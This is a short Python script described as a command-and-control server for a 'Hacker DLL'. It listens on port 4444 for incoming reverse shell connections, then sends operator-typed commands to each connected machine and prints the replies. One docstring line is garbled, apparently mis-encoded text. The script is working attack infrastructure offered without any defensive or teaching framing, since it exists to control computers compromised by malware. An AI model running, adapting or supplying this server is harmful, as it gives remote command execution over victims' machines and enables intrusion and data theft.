#!/usr/bin/env python3
"""
C2 Server for Hacker DLL
֧�ַ��� shell ����
"""

import socket
import threading
import sys
from datetime import datetime

HOST = '0.0.0.0'  
PORT = 4444

def handle_client(client_socket, client_address):
    print(f"[+] {datetime.now()} - New connection from {client_address}")
    
    try:
        init_msg = client_socket.recv(1024).decode('utf-8', errors='ignore')
        print(f"[*] {init_msg.strip()}")
        
        while True:
            command = input(f"{client_address}> ")
            if not command:
                continue
                
            if command.lower() in ['exit', 'quit']:
                print("[*] Closing connection...")
                break
            
            client_socket.send((command + "\n").encode())
            
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(response)
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()
        print(f"[*] Connection from {client_address} closed")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] C2 Server listening on {HOST}:{PORT}")
        print("[*] Waiting for reverse shell connections...")
        
        while True:
            client_sock, client_addr = server.accept()
            client_handler = threading.Thread(
                target=handle_client,
                args=(client_sock, client_addr)
            )
            client_handler.start()
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down server...")
    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    main()
